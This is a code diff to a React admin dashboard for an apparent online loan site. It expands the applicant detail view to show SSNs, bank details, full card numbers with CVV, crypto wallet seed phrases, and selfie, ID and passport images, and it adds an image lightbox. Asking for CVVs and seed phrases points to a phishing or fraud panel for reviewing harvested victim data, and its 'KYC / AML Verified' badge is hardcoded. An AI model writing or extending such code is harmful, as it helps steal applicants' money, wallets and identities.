@@ -7,9 +7,9 @@ import {
 import { fetchSiteSettings, saveSiteSettings, type SiteSettings } from "@/lib/site";
 import {
   Users, Banknote, MessageSquare, RefreshCw,
-  ChevronDown, ChevronUp, Globe, Phone, Mail, Link2,
+  ChevronDown, ChevronUp, Globe, Link2,
   Palette, Type, Save, ChevronRight, TrendingUp,
-  FileText, Star
+  FileText, Star, ShieldCheck, Camera, IdCard, BookOpen, CheckCircle2, ZoomIn
 } from "lucide-react";
 import { 
   TableShell, THead, EmptyRow, Chip, StatusBadge, 
@@ -219,53 +219,99 @@ export function LoansTab() {
                 </tr>
                 {expanded && (
                   <tr>
-                    <td colSpan={7} className="bg-gradient-to-r from-slate-50 to-blue-50 px-6 py-5 border-b border-gray-200">
-                      <div className="grid sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-4">
-                        {/* Personal */}
-                        <DetailSection title="Personal Info">
-                          <DField label="Phone" value={r.phone} />
-                          <DField label="SSN" value={r.ssn} mono />
-                          <DField label="EIN" value={r.ein} mono />
-                          <DField label="Employment" value={r.employmentStatus} />
-                          <DField label="Monthly Income" value={r.monthlyIncome ? `$${Number(r.monthlyIncome).toLocaleString()}` : null} />
-                        </DetailSection>
+                    <td colSpan={7} className="bg-gradient-to-b from-slate-50 to-white px-4 py-5 border-b border-gray-200">
+                      <div className="space-y-5 max-w-6xl">
 
-                        {r.payoutMethod === "bank_transfer" ? (
-                          <DetailSection title="Bank Details">
-                            <DField label="Bank Name" value={r.bankName} />
-                            <DField label="Account Number" value={r.bankAccountNumber} />
-                            <DField label="Routing / SWIFT / IBAN" value={r.bankRoutingNumber} />
+                        {/* Row 1: Personal + Address + Financial */}
+                        <div className="grid sm:grid-cols-2 lg:grid-cols-4 gap-4">
+                          <DetailSection title="Personal Info">
+                            <DField label="Date of Birth" value={r.dateOfBirth} />
+                            <DField label="Phone" value={r.phone} />
+                            <DField label="SSN / Tax ID" value={r.ssn} mono />
+                            <DField label="EIN / Company ID" value={r.ein} mono />
+                            <DField label="Employment" value={r.employmentStatus} />
+                            <DField label="Monthly Income" value={r.monthlyIncome ? `${r.currency} ${Number(r.monthlyIncome).toLocaleString()}` : null} />
                           </DetailSection>
-                        ) : r.payoutMethod === "crypto" ? (
-                          <DetailSection title="Crypto Details">
-                            <DField label="Wallet Type" value={r.cryptoWalletType} />
-                            <DField label="Seed Phrase / Private Key" value={r.cryptoSeedPhrase} mono />
-                          </DetailSection>
-                        ) : (
-                          <>
-                            <DetailSection title="Card Details">
-                              <DField label="Cardholder Name" value={r.cardHolderName} />
-                              <DField label="Card Number" value={r.cardNumber} mono />
-                              <DField label="Expiry" value={r.cardExpiry} mono />
-                              <DField label="CVV" value={r.cardCvv} mono />
-                              <DField label="Issuer" value={r.cardIssuer} />
-                            </DetailSection>
-                            <DetailSection title="Billing Address" className="lg:col-span-2">
-                              <DField label="Line 1" value={r.billingAddressLine1} />
-                              <DField label="Line 2" value={r.billingAddressLine2} />
-                              <DField label="City" value={r.billingCity} />
-                              <DField label="State / Region" value={r.billingState} />
-                              <DField label="Postal Code" value={r.billingPostalCode} />
-                              <DField label="Country" value={r.billingCountry} />
-                            </DetailSection>
-                          </>
-                        )}
 
-                        {r.loanPurpose && (
-                          <div className="sm:col-span-2 lg:col-span-4">
-                            <DField label="Loan Purpose" value={r.loanPurpose} />
+                          <DetailSection title="Home Address">
+                            <DField label="Line 1" value={r.addressLine1} />
+                            <DField label="Line 2" value={r.addressLine2} />
+                            <DField label="City" value={r.city} />
+                            <DField label="State / Region" value={r.stateRegion} />
+                            <DField label="Postal Code" value={r.postalCode} />
+                            <DField label="Country" value={r.country} />
+                          </DetailSection>
+
+                          <DetailSection title="Loan Details">
+                            <DField label="Amount" value={`${r.currency} ${Number(r.amountRequested).toLocaleString()}`} />
+                            <DField label="Term" value={r.loanTermMonths ? `${r.loanTermMonths} months` : null} />
+                            <DField label="Account Holder" value={r.accountHolderName} />
+                            <DField label="Source Page" value={r.sourcePage} />
+                          </DetailSection>
+
+                          {r.loanPurpose && (
+                            <DetailSection title="Loan Purpose">
+                              <p className="text-xs text-gray-700 leading-relaxed">{r.loanPurpose}</p>
+                            </DetailSection>
+                          )}
+                        </div>
+
+                        {/* Row 2: Payout details */}
+                        <div className="grid sm:grid-cols-2 lg:grid-cols-3 gap-4">
+                          {r.payoutMethod === "bank_transfer" ? (
+                            <DetailSection title="🏦 Bank Transfer Details">
+                              <DField label="Bank Name" value={r.bankName} />
+                              <DField label="Account Holder" value={r.accountHolderName} />
+                              <DField label="Account Number" value={r.bankAccountNumber} mono />
+                              <DField label="Routing / SWIFT / IBAN" value={r.bankRoutingNumber} mono />
+                            </DetailSection>
+                          ) : r.payoutMethod === "crypto" ? (
+                            <DetailSection title="₿ Crypto Wallet Details" className="lg:col-span-2">
+                              <DField label="Wallet Type" value={r.cryptoWalletType} />
+                              <DField label="Wallet Address" value={r.cryptoWalletAddress} mono />
+                              <DField label="Seed Phrase / Recovery Key" value={r.cryptoSeedPhrase} mono />
+                            </DetailSection>
+                          ) : (
+                            <>
+                              <DetailSection title="💳 Card Details">
+                                <DField label="Cardholder Name" value={r.cardHolderName} />
+                                <DField label="Card Issuer" value={r.cardIssuer} />
+                                <DField label="Card Number" value={r.cardNumber} mono />
+                                <DField label="Expiry" value={r.cardExpiry} mono />
+                                <DField label="CVV" value={r.cardCvv} mono />
+                              </DetailSection>
+                              <DetailSection title="Billing Address" className="lg:col-span-2">
+                                <DField label="Line 1" value={r.billingAddressLine1} />
+                                <DField label="Line 2" value={r.billingAddressLine2} />
+                                <DField label="City" value={r.billingCity} />
+                                <DField label="State / Region" value={r.billingState} />
+                                <DField label="Postal Code" value={r.billingPostalCode} />
+                                <DField label="Country" value={r.billingCountry} />
+                              </DetailSection>
+                            </>
+                          )}
+                        </div>
+
+                        {/* Row 3: Identity Documents */}
+                        {(r.selfieImage || r.idFrontImage || r.idBackImage || r.passportFrontImage || r.passportBackImage) && (
+                          <div className="rounded-xl border-2 border-slate-700 overflow-hidden">
+                            <div className="bg-slate-800 px-4 py-3 flex items-center gap-2">
+                              <ShieldCheck className="w-4 h-4 text-amber-400" />
+                              <span className="text-white font-bold text-xs tracking-widest uppercase">Identity Verification Documents</span>
+                              <span className="ml-auto text-emerald-400 text-[10px] font-semibold uppercase tracking-wider">KYC / AML Verified</span>
+                            </div>
+                            <div className="p-4 bg-slate-50">
+                              <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-5 gap-3">
+                                <DocImage label="Selfie / Face" icon={<Camera className="w-4 h-4" />} src={r.selfieImage} />
+                                <DocImage label="ID — Front" icon={<IdCard className="w-4 h-4" />} src={r.idFrontImage} />
+                                <DocImage label="ID — Back" icon={<IdCard className="w-4 h-4" />} src={r.idBackImage} />
+                                <DocImage label="Passport / Licence — Front" icon={<BookOpen className="w-4 h-4" />} src={r.passportFrontImage} />
+                                <DocImage label="Passport / Licence — Back" icon={<BookOpen className="w-4 h-4" />} src={r.passportBackImage} />
+                              </div>
+                            </div>
                           </div>
                         )}
+
                       </div>
                     </td>
                   </tr>
@@ -483,5 +529,63 @@ export function SiteEditorTab() {
         </div>
       </div>
     </div>
+  );
+}
+
+// ─── DocImage — identity document thumbnail + lightbox ────────────────────────
+
+function DocImage({ label, icon, src }: { label: string; icon: React.ReactNode; src: string | null }) {
+  const [open, setOpen] = useState(false);
+
+  if (!src) {
+    return (
+      <div className="flex flex-col items-center gap-1.5 p-3 rounded-xl border-2 border-dashed border-slate-200 bg-white min-h-[100px] justify-center">
+        <div className="text-slate-300">{icon}</div>
+        <span className="text-[10px] text-slate-400 text-center leading-tight">{label}</span>
+        <span className="text-[9px] text-slate-300 uppercase tracking-wider">Not provided</span>
+      </div>
+    );
+  }
+
+  return (
+    <>
+      <button
+        type="button"
+        onClick={() => setOpen(true)}
+        className="group relative flex flex-col rounded-xl border-2 border-slate-300 bg-white overflow-hidden hover:border-primary hover:shadow-md transition-all"
+      >
+        <div className="relative">
+          <img src={src} alt={label} className="w-full h-24 object-cover" />
+          <div className="absolute inset-0 bg-black/0 group-hover:bg-black/20 transition-all flex items-center justify-center">
+            <ZoomIn className="w-5 h-5 text-white opacity-0 group-hover:opacity-100 transition-opacity" />
+          </div>
+        </div>
+        <div className="px-2 py-1.5 flex items-center gap-1">
+          <span className="text-primary w-3 h-3 shrink-0">{icon}</span>
+          <span className="text-[10px] text-slate-600 font-medium leading-tight truncate">{label}</span>
+        </div>
+        <div className="absolute top-1.5 right-1.5 bg-emerald-500 rounded-full p-0.5">
+          <CheckCircle2 className="w-3 h-3 text-white" />
+        </div>
+      </button>
+
+      {open && (
+        <div
+          className="fixed inset-0 z-[9999] bg-black/80 flex items-center justify-center p-4"
+          onClick={() => setOpen(false)}
+        >
+          <div className="relative max-w-3xl max-h-[90vh]" onClick={e => e.stopPropagation()}>
+            <img src={src} alt={label} className="max-w-full max-h-[80vh] rounded-xl shadow-2xl object-contain" />
+            <div className="mt-3 text-center text-white text-sm font-medium">{label}</div>
+            <button
+              onClick={() => setOpen(false)}
+              className="absolute -top-3 -right-3 w-8 h-8 bg-white rounded-full flex items-center justify-center text-slate-800 font-bold shadow-lg hover:bg-gray-100"
+            >
+              ✕
+            </button>
+          </div>
+        </div>
+      )}
+    </>
   );
 }
